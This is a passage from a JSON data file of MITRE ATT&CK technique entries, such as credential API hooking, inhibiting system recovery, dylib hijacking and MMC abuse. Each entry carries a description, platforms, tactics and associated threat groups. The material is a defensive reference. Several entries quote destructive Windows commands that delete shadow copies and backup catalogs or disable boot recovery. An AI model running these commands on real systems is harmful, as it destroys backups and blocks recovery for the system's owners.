Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":[],"groups":["Kimsuky"]},"T1556":{"id":"T1556","name":"Modify Authentication Process","description":"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using [Valid Accounts](https://attack.mitre.org/techniques/T1078).\n\nAdversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.","platforms":["Windows","Linux","macOS","Network","Azure AD","Google Workspace","IaaS","Office 365","SaaS"],"tactics":["Credential Access","Defense Evasion","Persistence"],"campaigns":[],"groups":["FIN13"]},"T1056.004":{"id":"T1056.004","name":"Credential API Hooking","description":"Adversaries may hook into Windows application programming interface (API) functions to collect user credentials. Malicious hooking mechanisms may capture API calls that include parameters that reveal user authentication credentials.^[[1]](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=TrojanSpy:Win32/Ursnif.gen!I&threatId=-2147336918)^ Unlike [Keylogging](https://attack.mitre.org/techniques/T1056/001),  this technique focuses specifically on API functions that include parameters that reveal user credentials. Hooking involves redirecting calls to these functions and can be implemented via:\n\n* **Hooks procedures**, which intercept and execute designated code in response to events such as messages, keystrokes, and mouse inputs.^[[2]](https://msdn.microsoft.com/library/windows/desktop/ms644959.aspx)^^[[3]](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)^\n* **Import address table (IAT) hooking**, which use modifications to a process’s IAT, where pointers to imported API functions are stored.^[[3]](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)^^[[4]](https://www.adlice.com/userland-rootkits-part-1-iat-hooks/)^^[[5]](https://www.mwrinfosecurity.com/our-thinking/dynamic-hooking-techniques-user-mode/)^\n* **Inline hooking**, which overwrites the first bytes in an API function to redirect code flow.^[[3]](https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process)^^[[6]](https://www.exploit-db.com/docs/17802.pdf)^^[[5]](https://www.mwrinfosecurity.com/our-thinking/dynamic-hooking-techniques-user-mode/)^\n","platforms":["Windows"],"tactics":["Collection","Credential Access"],"campaigns":[],"groups":["PLATINUM"]},"T1495":{"id":"T1495","name":"Firmware Corruption","description":"Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.^[[1]](https://web.archive.org/web/20190508170055/https://www.symantec.com/security-center/writeup/2000-122010-2655-99)^ Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.\n\nIn general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable.^[[2]](https://cyber.dhs.gov/assets/report/ar-16-20173.pdf)^^[[3]](https://www.cisa.gov/uscert/ncas/alerts/aa22-057a)^ Depending on the device, this attack may also result in [Data Destruction](https://attack.mitre.org/techniques/T1485). ","platforms":["Linux","macOS","Windows","Network"],"tactics":["Impact"],"campaigns":[],"groups":[]},"T1490":{"id":"T1490","name":"Inhibit System Recovery","description":"Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery.^[[1]](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)^^[[2]](https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html)^ This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of [Data Destruction](https://attack.mitre.org/techniques/T1485) and [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).^[[1]](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)^^[[2]](https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html)^ Furthermore, adversaries may disable recovery notifications, then corrupt backups.^[[3]](https://twitter.com/TheDFIRReport/status/1498657590259109894)^\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* `vssadmin.exe` can be used to delete all volume shadow copies on a system - `vssadmin.exe delete shadows /all /quiet`\n* [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) can be used to delete volume shadow copies - `wmic shadowcopy delete`\n* `wbadmin.exe` can be used to delete the Windows Backup Catalog - `wbadmin.exe delete catalog -quiet`\n* `bcdedit.exe` can be used to disable automatic Windows recovery features by modifying boot configuration data - `bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no`\n* `REAgentC.exe` can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n\nOn network devices, adversaries may leverage [Disk Wipe](https://attack.mitre.org/techniques/T1561) to delete backup firmware images and reformat the file system, then [System Shutdown/Reboot](https://attack.mitre.org/techniques/T1529) to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\n\nAdversaries may also delete “online” backups that are connected to their network – whether via network storage media or through folders that sync to cloud services.^[[4]](https://www.zdnet.com/article/ransomware-victims-thought-their-backups-were-safe-they-were-wrong/)^ In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, machine images, and prior versions of objects designed to be used in disaster recovery scenarios.^[[5]](https://www.darkreading.com/attacks-breaches/code-hosting-service-shuts-down-after-cyber-attack)^^[[6]](https://rhinosecuritylabs.com/aws/s3-ransomware-part-2-prevention-and-defense/)^","platforms":["Windows","macOS","Linux","Network","IaaS","Containers"],"tactics":["Impact"],"campaigns":[],"groups":["Wizard Spider"]},"T1546.007":{"id":"T1546.007","name":"Netsh Helper DLL","description":"Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.^[[1]](https://technet.microsoft.com/library/bb490939.aspx)^ The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at `HKLM\\SOFTWARE\\Microsoft\\Netsh`.\n\nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.^[[2]](https://github.com/outflankbv/NetshHelperBeacon)^^[[3]](https://htmlpreview.github.io/?https://github.com/MatthewDemaske/blogbackup/blob/master/netshell.html)^","platforms":["Windows"],"tactics":["Privilege Escalation","Persistence"],"campaigns":[],"groups":[]},"T1566.003":{"id":"T1566.003","name":"Spearphishing via Service","description":"Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.","platforms":["Linux","macOS","Windows"],"tactics":["Initial Access"],"campaigns":["Operation Dream Job"],"groups":["CURIUM","Windshift","Ajax Security Team","EXOTIC LILY","FIN6","APT29","OilRig","Dark Caracal","Lazarus Group","Magic Hound"]},"T1090.001":{"id":"T1090.001","name":"Internal Proxy","description":"Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including [HTRAN](https://attack.mitre.org/software/S0040), ZXProxy, and ZXPortMap. ^[[1]](http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/)^ Adversaries use internal proxies to manage command and control communications inside a compromised environment, to reduce the number of simultaneous outbound network connections, to provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between infected systems to avoid suspicion. Internal proxy connections may use common peer-to-peer (p2p) networking protocols, such as SMB, to better blend in with the environment.\n\nBy using a compromised internal system as a proxy, adversaries may conceal the true destination of C2 traffic while reducing the need for numerous connections to external systems.","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":["SolarWinds Compromise","Operation Wocao"],"groups":["FIN13","Higaisa","Strider","Volt Typhoon","Turla","Lazarus Group","APT39","APT29","UNC2452","Operation Wocao"]},"T1216":{"id":"T1216","name":"System Script Proxy Execution","description":"Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.^[[1]](https://github.com/LOLBAS-Project/LOLBAS#criteria)^ This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.^[[2]](https://github.com/api0cradle/UltimateAppLockerByPassList)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1102.001":{"id":"T1102.001","name":"Dead Drop Resolver","description":"Adversaries may use an existing, legitimate external Web service to host information that points to additional command and control (C2) infrastructure. Adversaries may post content, known as a dead drop resolver, on Web services with embedded (and often obfuscated/encoded) domains or IP addresses. Once infected, victims will reach out to and be redirected by these resolvers.\n\nPopular websites and social media acting as a mechanism for C2 may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to a compromise. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. Web service providers commonly use SSL/TLS encryption, giving adversaries an added level of protection.\n\nUse of a dead drop resolver may also protect back-end C2 infrastructure from discovery through malware binary analysis while also enabling operational resiliency (since this infrastructure may be dynamically changed).","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":["C0017"],"groups":["Rocke","APT41","RTM","BRONZE BUTLER","Patchwork"]},"T1001.001":{"id":"T1001.001","name":"Junk Data","description":"Adversaries may add junk data to protocols used for command and control to make detection more difficult. By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters. ","platforms":["Linux","macOS","Windows"],"tactics":["Command and Control"],"campaigns":[],"groups":["APT28"]},"T1598.001":{"id":"T1598.001","name":"Spearphishing Service","description":"Adversaries may send spearphishing messages via third-party services to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.^[[1]](https://threatpost.com/facebook-launching-pad-phishing-attacks/160351/)^ These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries may create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and information about their environment. Adversaries may also use information from previous reconnaissance efforts (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) to craft persuasive and believable lures.","platforms":["PRE"],"tactics":["Reconnaissance"],"campaigns":["C0027"],"groups":[]},"T1552.007":{"id":"T1552.007","name":"Container API","description":"Adversaries may gather credentials via APIs within a containers environment. APIs in these environments, such as the Docker API and Kubernetes APIs, allow a user to remotely manage their container resources and cluster components.^[[1]](https://docs.docker.com/engine/api/v1.41/)^^[[2]](https://kubernetes.io/docs/concepts/overview/kubernetes-api/)^\n\nAn adversary may access the Docker API to collect logs that contain credentials to cloud, container, and various other resources in the environment.^[[3]](https://unit42.paloaltonetworks.com/attackers-tactics-and-techniques-in-unsecured-docker-daemons-revealed/)^ An adversary with sufficient permissions, such as via a pod's service account, may also use the Kubernetes API to retrieve credentials from the Kubernetes API server. These credentials may include those needed for Docker API authentication or secrets from Kubernetes cluster components. ","platforms":["Containers"],"tactics":["Credential Access"],"campaigns":[],"groups":[]},"T1584.001":{"id":"T1584.001","name":"Domains","description":"Adversaries may hijack domains and/or subdomains that can be used during targeting. Domain registration hijacking is the act of changing the registration of a domain name without the permission of the original registrant.^[[1]](https://www.icann.org/groups/ssac/documents/sac-007-en)^ Adversaries may gain access to an email account for the person listed as the owner of the domain. The adversary can then claim that they forgot their password in order to make changes to the domain registration. Other possibilities include social engineering a domain registration help desk to gain access to an account or taking advantage of renewal process gaps.^[[2]](https://krebsonsecurity.com/2019/02/a-deep-dive-on-the-recent-widespread-dns-hijacking-attacks/)^\n\nSubdomain hijacking can occur when organizations have DNS entries that point to non-existent or deprovisioned resources. In such cases, an adversary may take control of a subdomain to conduct operations with the benefit of the trust associated with that domain.^[[3]](https://docs.microsoft.com/en-us/azure/security/fundamentals/subdomain-takeover)^\n\nAdversaries who compromise a domain may also engage in domain shadowing by creating malicious subdomains under their control while keeping any existing DNS records. As service will not be disrupted, the malicious subdomains may go unnoticed for long periods of time.^[[4]](https://unit42.paloaltonetworks.com/domain-shadowing/)^","platforms":["PRE"],"tactics":["Resource Development"],"campaigns":["SolarWinds Compromise","Operation Dream Job","C0021","C0010"],"groups":["Magic Hound","SideCopy","Transparent Tribe","Kimsuky","APT1","Lazarus Group","UNC2452","APT29"]},"T1505.001":{"id":"T1505.001","name":"SQL Stored Procedures","description":"Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).\n\nAdversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers.^[[1]](https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/)^^[[2]](https://securelist.com/malicious-tasks-in-ms-sql-server/92167/)^ To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server.^[[1]](https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/)^^[[2]](https://securelist.com/malicious-tasks-in-ms-sql-server/92167/)^^[[3]](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-2017)^ \n\nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.).^[[4]](https://docs.microsoft.com/en-us/sql/relational-databases/clr-integration/common-language-runtime-integration-overview?view=sql-server-2017)^ Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.^[[5]](https://blog.netspi.com/attacking-sql-server-clr-assemblies/)^ ","platforms":["Windows","Linux"],"tactics":["Persistence"],"campaigns":["2016 Ukraine Electric Power Attack"],"groups":["Sandworm Team"]},"T1556.004":{"id":"T1556.004","name":"Network Device Authentication","description":"Adversaries may use [Patch System Image](https://attack.mitre.org/techniques/T1601/001) to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\n\n[Modify System Image](https://attack.mitre.org/techniques/T1601) may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.^[[1]](https://www.mandiant.com/resources/synful-knock-acis)^","platforms":["Network"],"tactics":["Credential Access","Defense Evasion","Persistence"],"campaigns":[],"groups":[]},"T1561.001":{"id":"T1561.001","name":"Disk Content Wipe","description":"Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources.\n\nAdversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.^[[1]](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)^^[[2]](https://web.archive.org/web/20160303200515/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf)^^[[3]](https://www.justice.gov/opa/press-release/file/1092091/download)^ Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.^[[2]](https://web.archive.org/web/20160303200515/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf)^ Adversaries have also been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.^[[1]](https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf)^^[[2]](https://web.archive.org/web/20160303200515/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf)^ This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).^[[2]](https://web.archive.org/web/20160303200515/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf)^","platforms":["Linux","macOS","Windows"],"tactics":["Impact"],"campaigns":[],"groups":["Lazarus Group"]},"T1048.003":{"id":"T1048.003","name":"Exfiltration Over Unencrypted Non-C2 Protocol","description":"Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.^[[1]](https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/C_commands.html#wp1068167689)^\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ","platforms":["Linux","macOS","Windows","Network"],"tactics":["Exfiltration"],"campaigns":["C0017"],"groups":["Lazarus Group","FIN8","Thrip","APT32","Wizard Spider","OilRig","APT33","FIN6"]},"T1574.004":{"id":"T1574.004","name":"Dylib Hijacking","description":"Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths. Paths to dylibs may be prefixed with `@rpath`, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable.  Additionally, if weak linking is used, such as the `LC_LOAD_WEAK_DYLIB` function, an application will still execute even if an expected dylib is not present. Weak linking enables developers to run an application on multiple macOS versions as new APIs are added.\n\nAdversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path.^[[1]](https://objective-see.com/blog/blog_0x46.html)^^[[2]](https://www.virusbulletin.com/uploads/pdf/magazine/2015/vb201503-dylib-hijacking.pdf)^^[[3]](https://github.com/EmpireProject/Empire/blob/master/lib/modules/python/situational_awareness/host/osx/HijackScanner.py)^^[[4]](https://github.com/EmpireProject/Empire/blob/08cbd274bef78243d7a8ed6443b8364acd1fc48b/lib/modules/python/persistence/osx/CreateHijacker.py)^ Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources. Based on the application, this could result in privilege escalation and uninhibited network access. This method may also evade detection from security products since the execution is masked under a legitimate process.^[[5]](https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf)^^[[6]](https://taomm.org/vol1/pdfs.html)^^[[7]](https://malwareunicorn.org/workshops/macos_dylib_injection.html#5)^","platforms":["macOS"],"tactics":["Persistence","Privilege Escalation","Defense Evasion"],"campaigns":[],"groups":[]},"T1601.002":{"id":"T1601.002","name":"Downgrade System Image","description":"Adversaries may install an older version of the operating system of a network device to weaken security.  Older operating system versions on network devices often have weaker encryption ciphers and, in general, fewer/less updated defensive features. ^[[1]](https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices)^\n\nOn embedded devices, downgrading the version typically only requires replacing the operating system file in storage.  With most embedded devices, this can be achieved by downloading a copy of the desired version of the operating system file and reconfiguring the device to boot from that file on next system restart.  The adversary could then restart the device to implement the change immediately or they could wait until the next time the system restarts.\n\nDowngrading the system image to an older versions may allow an adversary to evade defenses by enabling behaviors such as [Weaken Encryption](https://attack.mitre.org/techniques/T1600).  Downgrading of a system image can be done on its own, or it can be used in conjunction with [Patch System Image](https://attack.mitre.org/techniques/T1601/001).  ","platforms":["Network"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1078.003":{"id":"T1078.003","name":"Local Accounts","description":"Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.\n\nLocal Accounts may also be abused to elevate privileges and harvest credentials through [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. ","platforms":["Linux","macOS","Windows","Containers","Network"],"tactics":["Defense Evasion","Persistence","Privilege Escalation","Initial Access"],"campaigns":["SolarWinds Compromise","Operation Wocao"],"groups":["Kimsuky","PROMETHIUM","FIN10","APT32","Tropic Trooper","HAFNIUM","Turla","APT29","Stolen Pencil","Operation Wocao"]},"T1211":{"id":"T1211","name":"Exploitation for Defense Evasion","description":"Adversaries may exploit a system or application vulnerability to bypass security features. Exploitation of a vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in defensive security software that can be used to disable or circumvent them.\n\nAdversaries may have prior knowledge through reconnaissance that security software exists within an environment or they may perform checks during or shortly after the system is compromised for [Security Software Discovery](https://attack.mitre.org/techniques/T1518/001). The security software will likely be targeted directly for exploitation. There are examples of antivirus software being targeted by persistent threat groups to avoid detection.\n\nThere have also been examples of vulnerabilities in public cloud infrastructure of SaaS applications that may bypass defense boundaries ^[[1]](https://www.bleepingcomputer.com/news/security/hackers-exploited-salesforce-zero-day-in-facebook-phishing-attack/)^, evade security logs ^[[2]](https://securitylabs.datadoghq.com/articles/bypass-cloudtrail-aws-service-catalog-and-other/)^, or deploy hidden infrastructure.^[[3]](https://www.bleepingcomputer.com/news/security/ghosttoken-gcp-flaw-let-attackers-backdoor-google-accounts/)^","platforms":["Linux","Windows","macOS","SaaS","IaaS"],"tactics":["Defense Evasion"],"campaigns":[],"groups":["APT28"]},"T1127":{"id":"T1127","name":"Trusted Developer Utilities Proxy Execution","description":"Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.^[[1]](https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/)^^[[2]](https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/)^^[[3]](http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html)^^[[4]](https://lolbas-project.github.io/lolbas/OtherMSBinaries/Tracker/)^ These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1529":{"id":"T1529","name":"System Shutdown/Reboot","description":"Adversaries may shutdown/reboot systems to interrupt access to, or aid in the destruction of, those systems. Operating systems may contain commands to initiate a shutdown/reboot of a machine or network device. In some cases, these commands may also be used to initiate a shutdown/reboot of a remote computer or network device via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. `reload`).^[[1]](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/shutdown)^^[[2]](https://www.cisa.gov/uscert/ncas/alerts/TA18-106A)^\n\nShutting down or rebooting systems may disrupt access to computer resources for legitimate users while also impeding incident response/recovery.\n\nAdversaries may attempt to shutdown/reboot a system after impacting it in other ways, such as [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) or [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490), to hasten the intended effects on system availability.^[[3]](https://blog.talosintelligence.com/2017/06/worldwide-ransomware-variant.html)^^[[4]](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)^","platforms":["Linux","macOS","Windows","Network"],"tactics":["Impact"],"campaigns":[],"groups":["APT38","APT37","Lazarus Group"]},"T1218.014":{"id":"T1218.014","name":"MMC","description":"Adversaries may abuse mmc.exe to proxy execution of malicious .msc files. Microsoft Management Console (MMC) is a binary that may be signed by Microsoft and is used in several ways in either its GUI or in a command prompt.^[[1]](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mmc)^^[[2]](https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/what-is-microsoft-management-console)^ MMC can be used to create, open, and save custom consoles that contain administrative tools created by Microsoft, called snap-ins. These snap-ins may be used to manage Windows systems locally or remotely. MMC can also be used to open Microsoft created .msc files to manage system configuration.^[[3]](https://www.ghacks.net/2017/06/10/windows-msc-files-overview/)^\n\nFor example, `mmc C:\\Users\\foo\\admintools.msc /a` will open a custom, saved console msc file in author mode.^[[1]](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mmc)^ Another common example is `mmc gpedit.msc`, which will open the Group Policy Editor application window. \n\nAdversaries may use MMC commands to perform malicious tasks. For example, `mmc wbadmin.msc delete catalog -quiet` deletes the backup catalog on the system (i.e. [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)) without prompts to the user (Note: `wbadmin.msc` may only be present by default on Windows Server operating systems).^[[4]](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wbadmin-delete-catalog)^^[[5]](https://www.virustotal.com/gui/file/0b4c743246478a6a8c9fa3ff8e04f297507c2f0ea5d61a1284fe65387d172f81/detection)^\n\nAdversaries may also abuse MMC to execute malicious .msc files. For example, adversaries may first create a malicious registry Class Identifier (CLSID) subkey, which uniquely identifies a [Component Object Model](https://attack.mitre.org/techniques/T1559/001) class object.^[[6]](https://docs.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)^ Then, adversaries may create custom consoles with the “Link to Web Address” snap-in that is linked to the malicious CLSID subkey.^[[7]](https://research.checkpoint.com/2019/microsoft-management-console-mmc-vulnerabilities/)^ Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command: `mmc.exe -Embedding C:\\path\\to\\test.msc`.^[[8]](https://bohops.com/2018/08/18/abusing-the-com-registry-structure-part-2-loading-techniques-for-evasion-and-persistence/)^","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1564.010":{"id":"T1564.010","name":"Process Argument Spoofing","description":"Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.^[[1]](https://docs.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)^^[[2]](https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/)^\n\nAdversaries may manipulate a process PEB to evade defenses. For example, [Process Hollowing](https://attack.mitre.org/techniques/T1055/012) can be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the [Native API](https://attack.mitre.org/techniques/T1106) `WriteProcessMemory()` function) then resume process execution with malicious arguments.^[[3]](https://blog.cobaltstrike.com/2019/01/02/cobalt-strike-3-13-why-do-we-argue/)^^[[2]](https://blog.xpnsec.com/how-to-argue-like-cobalt-strike/)^^[[4]](https://blog.nviso.eu/2020/02/04/the-return-of-the-spoof-part-2-command-line-spoofing/)^\n\nAdversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.^[[5]](https://www.fireeye.com/blog/threat-research/2021/04/unc2447-sombrat-and-fivehands-ransomware-sophisticated-financial-threat.html)^\n\nThis behavior may also be combined with other tricks (such as [Parent PID Spoofing](https://attack.mitre.org/techniques/T1134/004)) to manipulate or further evade process-based detections.","platforms":["Windows"],"tactics":["Defense Evasion"],"campaigns":[],"groups":[]},"T1574.012":{"id":"T1574.012","name":"COR_PROFILER","description":"Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET 